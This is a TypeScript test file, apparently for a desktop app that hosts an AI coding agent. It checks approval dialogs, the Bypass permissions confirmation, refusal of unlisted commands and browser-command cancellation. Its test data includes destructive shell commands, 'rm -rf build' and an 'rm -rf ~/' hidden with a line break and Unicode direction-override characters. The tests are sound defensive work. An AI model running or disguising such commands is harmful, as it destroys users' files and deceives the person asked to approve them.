    const dialogs = showMessageBox.mock.calls.map(
      (call) =>
        (call as unknown[])[1] as {
          buttons: string[];
          defaultId: number;
          message: string;
          detail: string;
        },
    );
    expect(dialogs[0]?.message).toBe('Allow this in project?');
    expect(dialogs[0]?.detail).toContain('/approved/project');
    expect(dialogs[0]?.detail).toContain('Remove build');
    expect(dialogs[0]?.detail).toContain('$ rm -rf build');
    expect(dialogs[0]?.detail).toContain('rates this high risk');
    expect(dialogs[0]?.detail).not.toContain('A harmless read');
    expect(dialogs[0]?.buttons).toEqual(['Cancel', 'Allow once']);
    expect(dialogs[0]?.defaultId).toBe(0);
    expect(dialogs[1]?.detail).toContain('/Users/me/.zshrc');
    expect(dialogs[1]?.detail).toContain('changes files outside project');
    expect(dialogs[1]?.detail).toContain('cannot be undone');
    expect(dialogs[2]?.detail).toContain('did not rate the risk');
    expect(dialogs[3]?.detail).toContain('Trusting a folder');
    expect(dialogs[4]?.detail).toContain('git metadata, project configuration or a hook manager');
    expect(dialogs[5]?.detail).toContain('a remote this repository is not set up with');
    expect(dialogs[6]?.detail).toContain('a host the request names');
    expect(dialogs[7]?.detail).toContain('tool server');
    expect(dialogs[8]?.detail).toContain('tool server');
    expect(dialogs[9]?.detail).toContain('could not read');
    expect(answerDeveloperApproval).toHaveBeenCalledTimes(guarded.length);
  });

  it('asks in main for every kind of request that is not on the routine list, known or not', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    const reserved: Array<[string, string]> = [
      ['Git', "run the repository's hooks outside the sandbox"],
      ['Hook', 'runs a hook'],
      ['Subagent', 'starts another agent'],
      ['WorkspacePolicy', 'policy file in this repository'],
      ['ComputerUse', 'controls the mouse and keyboard'],
      ['SomethingNewer', 'always confirmed at this computer'],
      ['', 'always confirmed at this computer'],
    ];

    for (const [kind] of reserved) {
      readPendingApproval.mockResolvedValueOnce(
        review({ kind, command: null, riskLevel: 'medium', reversible: true }),
      );
      showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
      expect(
        await dispatch(window, 'developer_approval_answer', {
          ...answer,
          requestId: `ask-${kind}`,
          decision: 'approve_once',
        }),
        kind,
      ).toMatchObject({ ok: false, error: { code: 'cancelled' } });
    }

    expect(showMessageBox).toHaveBeenCalledTimes(reserved.length);
    for (const [index, [kind, fact]] of reserved.entries()) {
      const options = (showMessageBox.mock.calls[index] as unknown[])[1] as { detail: string };
      expect(options.detail, kind).toContain(fact);
    }
    expect(answerDeveloperApproval).not.toHaveBeenCalled();
  });

  it('opens one dialog for an approval, however often the page answers it meanwhile', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    readPendingApproval.mockResolvedValue(review({ riskLevel: 'high' }));
    let choose: (response: number) => void = () => undefined;
    showMessageBox.mockImplementationOnce(
      () =>
        new Promise((resolve) => {
          choose = (response) => resolve({ response, checkboxChecked: false });
        }),
    );

    const first = dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'approve_once',
    });
    await vi.waitFor(() => expect(showMessageBox).toHaveBeenCalledTimes(1));
    const second = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'approve_once',
    });

    expect(second).toMatchObject({
      ok: false,
      error: {
        code: 'invalid-arguments',
        message: 'That approval is already waiting for your answer.',
      },
    });
    expect(showMessageBox).toHaveBeenCalledTimes(1);
    choose(1);
    expect(await first).toMatchObject({ ok: true });
    expect(answerDeveloperApproval).toHaveBeenCalledTimes(1);

    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });
    expect(
      await dispatch(window, 'developer_approval_answer', { ...answer, decision: 'approve_once' }),
    ).toMatchObject({ ok: true });
  });

  it('asks in main before an allow that stands for the rest of the session, however low the risk', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });

    const allowed = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'approve_for_session',
    });

    expect(allowed).toMatchObject({ ok: true });
    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as {
      buttons: string[];
      detail: string;
    };
    expect(options.buttons).toEqual(['Cancel', 'Allow for this session']);
    expect(options.detail).toContain('$ pnpm test');
    expect(options.detail).toContain('without asking');
    expect(answerDeveloperApproval).toHaveBeenCalledWith({
      ...answer,
      decision: 'approve_for_session',
    });
  });

  it('sends no allow when main is told Cancel, or the CLI no longer holds the approval', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    readPendingApproval
      .mockResolvedValueOnce(review({ riskLevel: 'high' }))
      .mockResolvedValueOnce(null);
    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });

    const cancelled = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'approve_once',
    });
    const gone = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'approve_once',
    });

    expect(cancelled).toMatchObject({
      ok: false,
      error: { code: 'cancelled', message: expect.stringContaining('still waiting') },
    });
    expect(gone).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(showMessageBox).toHaveBeenCalledTimes(1);
    expect(answerDeveloperApproval).not.toHaveBeenCalled();
  });

  it('shows a character that would hide or reorder the command as a mark, and a line break as one too', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    readPendingApproval.mockResolvedValueOnce(
      review({ riskLevel: 'high', command: 'echo safe\nrm -rf \u202E~/\u0007' }),
    );
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });

    await dispatch(window, 'developer_approval_answer', { ...answer, decision: 'approve_once' });

    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as { detail: string };
    expect(options.detail).toContain('Command: $ echo safe\u23CErm -rf \uFFFD~/\uFFFD');
    expect(options.detail.split('\n').filter((line) => line.startsWith('rm -rf'))).toEqual([]);
  });

  it('keeps a Cancel chosen in its dialog: allowing again from the page asks nothing more', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-declined' };
    readPendingApproval.mockResolvedValue(review({ riskLevel: 'high' }));
    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
    const allow = () =>
      dispatch(window, 'developer_approval_answer', { ...answer, decision: 'approve_once' });

    expect(await allow()).toMatchObject({ ok: false, error: { code: 'cancelled' } });
    for (let resend = 0; resend < 3; resend += 1) {
      expect(await allow()).toMatchObject({
        ok: false,
        error: {
          code: 'invalid-arguments',
          message: expect.stringContaining('You chose Cancel for this request at this computer'),
        },
      });
    }
    expect(showMessageBox).toHaveBeenCalledTimes(1);
    expect(answerDeveloperApproval).not.toHaveBeenCalled();

    expect(
      await dispatch(window, 'developer_approval_answer', { ...answer, decision: 'deny' }),
    ).toMatchObject({ ok: true });

    noteDeveloperSessionEvent(root.id, {
      type: 'approval-answered',
      threadId: turn.threadId,
      turnId: 'turn-1',
      requestId: 'ask-declined',
      approved: false,
      decision: 'deny',
    });
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });
    expect(await allow()).toMatchObject({ ok: true });
    expect(showMessageBox).toHaveBeenCalledTimes(2);
  });

  it('opens no second dialog for a request a paired phone already has one open for', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-shared' };
    readPendingApproval.mockResolvedValue(review({ riskLevel: 'high' }));
    expect(
      beginApprovalConfirmation({
        rootId: root.id,
        threadId: turn.threadId,
        requestId: 'ask-shared',
      }),
    ).toBe(true);

    expect(
      await dispatch(window, 'developer_approval_answer', { ...answer, decision: 'approve_once' }),
    ).toMatchObject({
      ok: false,
      error: { code: 'invalid-arguments', message: expect.stringContaining('already waiting') },
    });
    expect(showMessageBox).not.toHaveBeenCalled();
  });

  it('sends a denial straight through, without reading the approval or asking', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };

    for (const decision of ['deny', 'deny_and_stop'] as const) {
      expect(
        await dispatch(window, 'developer_approval_answer', { ...answer, decision }),
      ).toMatchObject({ ok: true });
    }

    expect(readPendingApproval).not.toHaveBeenCalled();
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(answerDeveloperApproval).toHaveBeenCalledTimes(2);
  });

  it('confirms the first Bypass permissions turn of a session in main, once', async () => {
    const session = { rootId: root.id, threadId: 'thread-bypass' };
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });

    await dispatch(window, 'developer_turn_start', { ...session, text: 'go', agentMode: 'bypass' });
    await dispatch(window, 'developer_turn_start', {
      ...session,
      text: 'more',
      agentMode: 'bypass',
    });
    await dispatch(window, 'developer_turn_start', { ...session, text: 'ask', agentMode: 'ask' });

    expect(showMessageBox).toHaveBeenCalledTimes(1);
    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as { detail: string };
    expect(options.detail).toContain('without asking you first');
    expect(startDeveloperTurn).toHaveBeenCalledTimes(3);
  });

  it('starts no Bypass permissions turn the user declined in main', async () => {
    const session = { rootId: root.id, threadId: 'thread-declined' };
    showMessageBox
      .mockResolvedValueOnce({ response: 0, checkboxChecked: false })
      .mockResolvedValueOnce({ response: 0, checkboxChecked: false });

    const first = await dispatch(window, 'developer_turn_start', {
      ...session,
      text: 'go',
      agentMode: 'bypass',
    });
    const again = await dispatch(window, 'developer_turn_start', {
      ...session,
      text: 'go',
      agentMode: 'bypass',
    });

    expect(first).toMatchObject({ ok: false, error: { code: 'cancelled' } });
    expect(again).toMatchObject({
      ok: false,
      error: { code: 'cancelled', message: expect.stringContaining('was not asked again') },
    });
    expect(showMessageBox).toHaveBeenCalledTimes(1);
    expect(startDeveloperTurn).not.toHaveBeenCalled();
  });

  it('defaults the Bypass permissions question to Cancel, and runs nothing it was not allowed', async () => {
    for (const [index, response] of [0, -1, 2, 7].entries()) {
      showMessageBox.mockResolvedValueOnce({ response, checkboxChecked: false });
      const answered = await dispatch(window, 'developer_turn_start', {
        rootId: root.id,
        threadId: `thread-closed-${index}`,
        text: 'go',
        agentMode: 'bypass',
      });
      expect(answered, `response ${response}`).toMatchObject({
        ok: false,
        error: { code: 'cancelled' },
      });
    }

    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as {
      buttons: string[];
      defaultId: number;
      cancelId: number;
    };
    expect(options.buttons[options.defaultId]).toBe('Cancel');
    expect(options.buttons[options.cancelId]).toBe('Cancel');
    expect(startDeveloperTurn).not.toHaveBeenCalled();
  });

  it('passes an answer or a cancel to a question, and refuses anything else', async () => {
    const ids = { ...turn, turnId: 'turn-1', requestId: 'q-1' };

    await dispatch(window, 'developer_user_input_answer', { ...ids, answer: 'main' });
    await dispatch(window, 'developer_user_input_answer', { ...ids, answer: null });
    const refused = await dispatch(window, 'developer_user_input_answer', { ...ids, answer: 3 });

    expect(answerDeveloperUserInput.mock.calls).toEqual([
      [{ ...ids, answer: 'main' }],
      [{ ...ids, answer: null }],
    ]);
    expect(refused).toMatchObject({ ok: false });
  });
});

/**
 * The contract lists are what a page, a guard or another surface reads to know
 * what this shell answers. A name listed there with no case behind it, or a
 * case added without listing it, is the drift this holds shut.
 */
describe('the commands the contract lists', () => {
  const LISTED = new Set<string>([
    ...WORKSPACE_COMMANDS,
    ...LOCAL_ROUTINE_COMMANDS,
    ...SSH_ENVIRONMENT_COMMANDS,
    ...FILESYSTEM_COMMANDS,
    ...SHELL_COMMANDS,
    ...APPLICATION_COMMANDS,
    ...CLIPBOARD_COMMANDS,
    ...BROWSER_PAIRING_COMMANDS,
    ...REMOTE_CONTROL_COMMANDS,
    ...PERMISSION_COMMANDS,
    ...WINDOW_LAYOUT_COMMANDS,
    ...DEVICE_HOST_COMMANDS,
    ...DEVELOPER_SESSION_COMMANDS,
    ...DEVICE_STEP_TOOLS.map(deviceStepCommand),
    DEVICE_REGISTRY_PROFILE_COMMAND,
  ]);
  /** Answered here although no contract list names them. */
  const ANSWERED_UNLISTED = new Set<string>([
    BROWSER_SIGN_IN_START,
    BROWSER_SIGN_IN_CANCEL,
    BROWSER_SIGN_IN_STATE,
    DISPATCH_TASK_REPORT,
    DISPATCH_TASK_RUNNER_READY,
    'background_activity',
    'background_stop',
    'browser_activity',
    'browser_downloads_open',
    'computer_hand_back',
    'computer_take_over',
    'computer_use_finish',
    'computer_use_set_enabled',
    'computer_use_status',
    'permission_review',
    'system_permission_open',
  ]);
  /** Named for another host, or retired from this one: no page asks this shell for them. */
  const NOT_ANSWERED_HERE = new Set<string>(['phone_step']);
  const CONSTANT_LABELS: Record<string, string> = {
    BROWSER_SIGN_IN_START,
    BROWSER_SIGN_IN_CANCEL,
    BROWSER_SIGN_IN_STATE,
    BROWSER_STEP_COMMAND,
    DEVICE_REGISTRY_PROFILE_COMMAND,
    DISPATCH_TASK_REPORT,
    DISPATCH_TASK_RUNNER_READY,
  };

  it('are each answered by the dispatcher', async () => {
    vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    requestPermission.mockResolvedValue('granted');
    showMessageBox.mockResolvedValue({ response: 0, checkboxChecked: false });

    for (const command of [...LISTED, ...ANSWERED_UNLISTED]) {
      if (NOT_ANSWERED_HERE.has(command)) continue;
      const response = await dispatch(window, command, { rootId: root.id });
      const code = response.ok ? null : response.error.code;
      expect(code, command).not.toBe('unknown-command');
    }
  });

  /**
   * Read from the source, because the defect this holds shut is a `case`
   * someone added without deciding what it needs: no test written beside the
   * tables would have named it.
   */
  function casesTheDispatcherRuns(): string[] {
    const source = readFileSync(path.resolve(__dirname, '../runtime/dispatcher.ts'), 'utf8');
    const body = source.slice(
      source.indexOf('async function execute('),
      source.indexOf('class UnknownCommand'),
    );
    const labels = [...body.matchAll(/^ {4}case ([^:\n]+):/gmu)].map(
      ([, label]) =>
        CONSTANT_LABELS[label ?? ''] ??
        /^'([a-z_]+)'$/u.exec(label ?? '')?.[1] ??
        `unread label ${label}`,
    );
    expect(labels).toHaveLength(body.match(/^\s*case\s/gmu)?.length ?? 0);
    return labels;
  }

  it('are the cases the dispatcher has, each declared and under exactly one gate', () => {
    const cases = casesTheDispatcherRuns();

    expect(cases.length).toBeGreaterThan(60);
    for (const command of cases) {
      expect(LISTED.has(command) || ANSWERED_UNLISTED.has(command), command).toBe(true);
      expect(NOT_ANSWERED_HERE.has(command), command).toBe(false);
      expect(commandGates(command), command).toHaveLength(1);
    }
    for (const command of LISTED) {
      if (!NOT_ANSWERED_HERE.has(command)) expect(cases, command).toContain(command);
    }
  });

  it('refuses a name no gate lists before any service or prompt, whatever an object would answer for it', async () => {
    for (const command of ['shell_run_unchecked', 'constructor', 'toString', '__proto__', '']) {
      expect(commandGates(command), command).toEqual([]);
      expect(await dispatch(window, command, { rootId: root.id }), command).toMatchObject({
        ok: false,
        error: { code: 'unknown-command' },
      });
    }
    expect(requestPermission).not.toHaveBeenCalled();
    expect(showMessageBox).not.toHaveBeenCalled();
  });

  it('leave out what no page asks this shell for', async () => {
    for (const command of NOT_ANSWERED_HERE) {
      expect(commandGates(command), command).toEqual([]);
      expect(await dispatch(window, command, { rootId: root.id }), command).toMatchObject({
        ok: false,
        error: { code: 'unknown-command' },
      });
    }
  });
});

describe('browser command cancellation at the dispatcher', () => {
  const caller = { name: 'agi', subject: 'The AGI CLI', folder: null, path: null };

  it('refuses an already-cancelled command before permission lookup', async () => {
    const controller = new AbortController();
    controller.abort();
    const { runBrowserCommand } = await import('../runtime/dispatcher');

    const result = await runBrowserCommand(
      null,
      'browser_read_page',
      {},
      caller,
      controller.signal,
    );

    expect(result).toMatchObject({ ok: false, error: { code: 'cancelled' } });
    expect(getPermissionState).not.toHaveBeenCalled();
    expect(requestPermission).not.toHaveBeenCalled();
    expect(sendBrowserCommand).not.toHaveBeenCalled();
    expect(consumeSingleUse).not.toHaveBeenCalled();
  });

  it('does not send a command when its requester leaves during permission review', async () => {
    let grant!: (value: PermissionState) => void;
    requestPermission.mockReturnValueOnce(
      new Promise((resolve) => {
        grant = resolve;
      }),
    );
    getPermissionState.mockReturnValue('prompt');
    const controller = new AbortController();
    const { runBrowserCommand } = await import('../runtime/dispatcher');

    const pending = runBrowserCommand(null, 'browser_read_page', {}, caller, controller.signal);
    expect(requestPermission).toHaveBeenCalledOnce();
    controller.abort();
    grant('granted');

    await expect(pending).resolves.toMatchObject({ ok: false, error: { code: 'cancelled' } });
    expect(sendBrowserCommand).not.toHaveBeenCalled();
    expect(consumeSingleUse).not.toHaveBeenCalled();
  });

  it('keeps permission denial terminal for an active requester', async () => {
    getPermissionState.mockReturnValue('denied');
    const { runBrowserCommand } = await import('../runtime/dispatcher');

    const result = await runBrowserCommand(
      null,
      'browser_read_page',
      {},
      caller,
      new AbortController().signal,
    );

    expect(result).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect(sendBrowserCommand).not.toHaveBeenCalled();
    expect(consumeSingleUse).not.toHaveBeenCalled();
  });

  it('forwards the same active signal and consumes the scoped grant only after success', async () => {
    sendBrowserCommand.mockResolvedValueOnce({ title: 'Example' });
    const controller = new AbortController();
    const { runBrowserCommand } = await import('../runtime/dispatcher');

    const result = await runBrowserCommand(
      null,
      'browser_read_page',
      {},
      caller,
      controller.signal,
    );

    expect(result).toEqual({ ok: true, value: { title: 'Example' } });
    expect(sendBrowserCommand).toHaveBeenCalledExactlyOnceWith(
      'browser_read_page',
      {},
      undefined,
      controller.signal,
    );
    expect(consumeSingleUse).toHaveBeenCalledExactlyOnceWith('browser.site', {
      kind: 'application',
      target: caller.name,
    });
  });
});

describe('session browser destination ownership', () => {
  beforeEach(() => {
    showMessageBox.mockReset();
    showMessageBox.mockResolvedValue({ response: 0, checkboxChecked: false });
    sendBrowserCommand.mockReset();
  });
  const caller = {
    name: 'agi session owned-1',
    subject: 'Session owned-1',
    folder: null,
    path: null,
  };
  const url = 'https://example.test/owned';
  it('opens a fresh paired tab without replacing the active user tab', async () => {
    sendBrowserCommand.mockResolvedValueOnce({ tabId: 91, destination: 'paired-browser' });
    const { runBrowserCommand } = await import('../runtime/dispatcher');
    const result = await runBrowserCommand(null, 'browser_open_tab', { url }, caller);
    expect(result).toMatchObject({ ok: true, value: { tabId: 91 } });
    expect(sendBrowserCommand).toHaveBeenCalledWith(
      'browser_open_tab',
      { url },
      undefined,
      undefined,
    );
    expect(openExternal).not.toHaveBeenCalled();
  });
  it('asks once before a disconnected browser falls back to the default browser', async () => {
    browserConnection.connected = false;
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });
    const { runBrowserCommand } = await import('../runtime/dispatcher');
    expect(await runBrowserCommand(null, 'browser_open_tab', { url }, caller)).toMatchObject({
      ok: true,
      value: { destination: 'default-browser', sharedProfile: true },
    });
    expect(openExternal).toHaveBeenCalledExactlyOnceWith(url);
    expect(sendBrowserCommand).not.toHaveBeenCalled();
  });
  it('keeps a denied fallback terminal', async () => {
    browserConnection.connected = false;
    const { runBrowserCommand } = await import('../runtime/dispatcher');
    expect(await runBrowserCommand(null, 'browser_open_tab', { url }, caller)).toMatchObject({
      ok: false,
    });
    expect(openExternal).not.toHaveBeenCalled();
  });
  it('does not fall back after an uncertain paired dispatch', async () => {
    sendBrowserCommand.mockRejectedValueOnce(new Error('paired timeout'));
    const { runBrowserCommand } = await import('../runtime/dispatcher');
    await expect(runBrowserCommand(null, 'browser_open_tab', { url }, caller)).rejects.toThrow(
      'paired timeout',
    );
    expect(openExternal).not.toHaveBeenCalled();
  });
  it('cancels a fallback before its reviewed URL is dispatched', async () => {
    browserConnection.connected = false;
    const controller = new AbortController();
    showMessageBox.mockImplementationOnce(async () => {
      controller.abort();
      return { response: 1, checkboxChecked: false };
    });
    const { runBrowserCommand } = await import('../runtime/dispatcher');
    expect(
      await runBrowserCommand(null, 'browser_open_tab', { url }, caller, controller.signal),
    ).toMatchObject({ ok: false });
    expect(openExternal).not.toHaveBeenCalled();
  });
});

it('does not turn an SSH start requested on a local root into a local session', async () => {
  const result = await dispatch(window, 'developer_session_start', {
    rootId: root.id,
    environment: 'ssh',
  });
  expect(result).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
  expect(startDeveloperSession).not.toHaveBeenCalled();
});
